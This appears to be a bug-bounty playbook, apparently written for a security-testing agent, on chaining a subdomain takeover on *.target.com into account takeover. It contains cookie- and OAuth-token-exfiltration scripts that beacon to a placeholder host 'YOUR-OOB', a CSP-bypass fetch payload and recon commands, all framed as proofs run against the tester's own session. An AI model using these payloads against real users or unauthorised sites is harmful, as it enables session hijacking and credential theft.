# Convert chains — from a page on *.target.com to proven ATO

## Contents
- Chain 1 — session-cookie theft (`Domain=.target.com`) → account takeover [High]
- Chain 2 — OAuth / SSO `redirect_uri` capture → token theft / ATO [High]
- Chain 3 — CSP / `script-src` trust → script execution in the parent origin [High]
- Chain 4 — framing / postMessage trust [Medium–High]
- Chain 5 — broken-link hijacking (expired asset/handle) [Medium–High]
- The sibling state: the subdomain is CLAIMED — by someone who is not the target
- If a chain captures a secret

Hosting content on a trusted subdomain is the **primitive**. On its own it is
usually Medium ("trusted-domain phishing/malware host"). What makes it High is
the **trust the parent app extends to `*.target.com`**. Before you claim, grep
the parent app's JS/HTML (js-source-to-sink hands you these) and its response
headers for the four trust surfaces below, then demonstrate the chain against
**your own** test session only. Never touch a real user's cookie/session/token.

Recon the trust surface first:

```bash
# 1. Cookie scope — are session cookies shared across the whole domain?
curl -sI https://app.target.com/ | grep -i set-cookie      # Domain=.target.com ? __Host- prefix ?
# 2. CSP — does the parent trust *.target.com for scripts/frames?
curl -sI https://app.target.com/ | grep -i content-security-policy
# 3. OAuth — is the takeoverable subdomain a registered redirect/callback?
grep -RniE 'redirect_uri|redirect_url|callback|client_id|response_type' targets/<program>/js/
# 4. Broken links — does a live page load an asset from an expired host/handle?
grep -RniE 'src=|href=|import .*from' targets/<program>/js/ | grep -i '<expired-host>'
```

## Chain 1 — session-cookie theft (`Domain=.target.com`) → account takeover [High]

**When:** the parent app sets its session/auth cookie with a `Domain=.target.com`
attribute (so it is sent to *every* subdomain) and the cookie name has **no
`__Host-` prefix** (`__Host-` cookies are locked to the exact host and are NOT
shared — those defeat this chain).

**Why it works:** a cookie scoped to `.target.com` is transmitted to your
taken-over `sub.target.com`. Same-origin policy does not protect it — your page
*is* on `target.com`.

**Proof (own session, non-destructive):**
1. Log into the app with **your own** test account; confirm the session cookie is
   `Domain=.target.com` and not `HttpOnly`-only-blocking-you — note: `HttpOnly`
   blocks `document.cookie` reads, so this chain needs a **non-HttpOnly**
   session/auth token, OR the cookie is auto-sent on a fetch your page makes to an
   endpoint that reflects it. Two sub-cases:
   - **Non-HttpOnly cookie** → your hosted page reads it directly:
     ```html
     <!-- served on the taken-over sub.target.com -->
     <script>new Image().src='https://YOUR-OOB/c?'+encodeURIComponent(document.cookie)</script>
     ```
   - **HttpOnly cookie** → your page can't read it, but any `fetch()` your page
     makes to `*.target.com` still *sends* it; abuse an authenticated endpoint on
     the same registrable domain that echoes account data, or pair with a CSRF /
     token-reflection endpoint to lift a bearer/CSRF token.
2. Load your marker page as **your own** logged-in session in another tab; confirm
   your OOB listener received *your* cookie value. That is the E2E proof — do not
   run it against anyone else's session.
3. Show the captured cookie replays into an authenticated request (`/me`,
   account page) = account takeover.

Evidence: the `Set-Cookie` with `Domain=.target.com`, the exfil hit on your OOB
with your own cookie, and one authenticated replay. Severity High.

## Chain 2 — OAuth / SSO `redirect_uri` capture → token theft / ATO [High]

**When:** the takeoverable subdomain is a registered OAuth `redirect_uri` /
callback, or the IdP allowlists `*.target.com` / a specific taken-over host.

**Why it works:** the authorization server will happily send the `code` /
`access_token` to a `redirect_uri` it trusts. If you control that host, you
receive the victim's authorization response.

**Proof (own account, non-destructive):**
1. From the JS, extract the authorize URL: `client_id`, `redirect_uri`,
   `response_type` (`code` = auth-code flow; `token`/`id_token` = implicit — the
   token lands in the URL **fragment**).
2. Serve a capture page on the taken-over subdomain that logs the incoming
   `?code=` / `#access_token=`:
   ```html
   <script>
   const p = new URLSearchParams(location.search);
   const h = new URLSearchParams(location.hash.slice(1));
   new Image().src='https://YOUR-OOB/o?code='+ (p.get('code')||h.get('access_token'));
   </script>
   ```
3. Run the full flow as **your own** test user (start at the app's login,
   complete SSO). Confirm your capture page receives *your* `code`/token. For
   auth-code flow, exchange your own `code` at the token endpoint to show it
   yields a working access token (`Authorization: Bearer` → `/me` = your account)
   — proving that a real victim's `code` would equally yield their account = ATO.
4. If the redirect target is a cloud IdP (Cognito/Azure), hand the stolen-token
   escalation to `cloud-exploitation`.

Evidence: the authorize URL showing the takeoverable `redirect_uri`, your capture
page receiving your own `code`, and the token-exchange → authenticated `/me`.
Severity High.

## Chain 3 — CSP / `script-src` trust → script execution in the parent origin [High]

**When:** the parent app's CSP `script-src` (or `frame-src`/`default-src`) allows
`*.target.com` or the specific taken-over host. A remote attacker's script is
blocked by that CSP — but a script hosted on the trusted subdomain is **allowed**.

**Why it works:** you now control a host inside the CSP allowlist, so a script you
serve there can be loaded/executed in the parent app's context, defeating the
exact control meant to stop XSS.

**Proof (own session, non-destructive):**
1. Confirm the CSP: `curl -sI https://app.target.com/ | grep -i content-security-policy`
   and find `script-src` (or `frame-src`) containing `*.target.com` or the host.
2. Find (or already have via an HTML-injection sink the CSP was mitigating) a way
   the parent references a script/frame on `*.target.com`. Host on the taken-over
   subdomain:
   ```html
   <!-- sub.target.com/poc.js — executes in app.target.com's origin -->
   /* proof: read ANY same-origin authenticated endpoint the app exposes — the
      canonical "who am I" / session route (whatever the app calls it) — and
      beacon only a benign marker (length), never the raw body */
   fetch('<app-authed-endpoint>',{credentials:'include'}).then(r=>r.text())
     .then(t=>new Image().src='https://YOUR-OOB/csp?len='+t.length);
   ```
3. Demonstrate execution against **your own** logged-in session (e.g. read your
   own account/session endpoint and beacon only its length / a benign marker — not
   the raw PII).
   Script running in-origin = stored-XSS-equivalent data read / action on the main
   app.

Evidence: the CSP header naming the trusted host, your script executing in the
parent origin, and the benign in-origin read. Severity High. Hand DOM/postMessage
sink follow-up to `js-source-to-sink`.

## Chain 4 — framing / postMessage trust [Medium–High]

**When:** the parent app frames `*.target.com`, or a `postMessage` handler trusts
`event.origin.endsWith('.target.com')`.

**Proof:** host a page on the taken-over subdomain that the parent frames (or that
frames the parent) and sends the `postMessage` the handler trusts; show the
handler acts on your message (state change / token relay). Demonstrate against
your own session. Grade by what the handler does — token relay/ATO = High, benign
= Medium.

## Chain 5 — broken-link hijacking (expired asset/handle) [Medium–High]

**When:** a **live** page on the target loads a third-party asset (JS/CDN/social
handle) whose host or account has expired and is re-registerable — the DNS record
may be fine; the *linked resource* is what's dangling.

**Proof (own visit, non-destructive):**
1. Re-register the expired asset/handle (the dropped npm-CDN path, the abandoned
   social handle the page links to, the expired script host).
2. Serve a **benign** marker script; visit the live target page in **your own**
   browser and show your script loaded/executed in the page context (beacon a
   harmless marker to your OOB). If the script runs in the app origin, this is
   XSS-equivalent (chain into #3's data read).

Evidence: the live page's reference to the expired asset, your re-registration,
and your benign script executing on a real page. Broken-link hijacking is a class
d0x has already submitted on some targets — where a specific host is already
reported it is CLOSED; reuse the technique on a **new** target (dedup first).

## The sibling state: the subdomain is CLAIMED — by someone who is not the target

Everything above assumes the resource is **unclaimed** and you take it. There is a
second state this skill will otherwise walk straight past: the record resolves, the
host answers `200` with a complete working application, nothing says "unclaimed" — and
the application is not the target's. A vendor, an agency, a regional partner or a
long-forgotten pilot is running their own product on `<something>.<target>.com`.

`subjack`, `nuclei`'s takeover templates and every fingerprint in `catalog.md` report
this as **not vulnerable**, because by their definition it is not. Judge ownership
instead of claimability:

```bash
H=sub.target.com
dig +short A "$H"                                     # 1. where does it point
curl -s "https://ipinfo.io/$(dig +short A "$H" | tail -1)/json" | jq '.org,.country'
                                                      #    an org/ASN unrelated to the brand
echo | openssl s_client -connect "$H:443" -servername "$H" 2>/dev/null   | openssl x509 -noout -subject -ext subjectAltName   # 2. WHOSE certificate is it
```

**The certificate is the cleanest tell.** A third party terminating TLS on a brand
subdomain has to hold a certificate for it, and they issue their own — so the subject
and SAN name *their* domain, not the brand's. Subject `CN=shop.<vendor>.com` on a host
called `<sub>.<target>.com` is proof of third-party control that needs no further
argument. An ASN belonging to an unrelated hosting provider in an unexpected country
corroborates it.

**Why this is worth more than the takeover you did not get.** The five chains above
describe what an attacker gains *if* they claim the host. Here a third party already
holds it, permanently and by configuration — so every one of those chains is live
right now, without an attacker doing anything: domain-scoped cookies are transmitted
to them on every visit, they sit inside any `*.target.com` CSP allowance, they are a
candidate for wildcard OAuth redirects, and their pages are same-site for framing and
`postMessage`. Run the same trust-surface recon from the top of this file and report
what the parent app actually extends to them.

Then judge the application on its own merits, because it is unreviewed code wearing a
trusted name: a build archive at its webroot, its object storage, its unauthenticated
routes, a login form collecting the brand's users' credentials on a host the brand does
not operate. In the corpus case that application was serving passport scans out of a
public bucket.

**Report it as what it is** — third-party control of brand-trusted namespace, evidenced
by the certificate — not as a takeover, and not as a cookie-flag issue. The asset
belongs to the brand's attack surface even though the code does not.

**Corpus case:** `3716618` — `h1/reports/3716618-paypal-duplicate.md` (critical ·
duplicate; brand subdomain resolving to an unrelated ASN, third-party certificate, a
build archive at its webroot and a public object-storage listing behind it).

## If a chain captures a secret

Some apps POST API keys / bearer tokens to a subdomain (analytics beacons,
webhooks, misconfigured clients). If your taken-over subdomain receives one, run
it past `../../_shared/references/public-by-default-keys.md` FIRST: SKIP the
public-by-default ones silently (Sentry DSN, Stripe `pk_`, Maps `AIza`,
analytics write keys). Only a data/PII/compute-unlocking key is worth chaining →
hand to `exposed-secrets` to call the service API and prove impact.
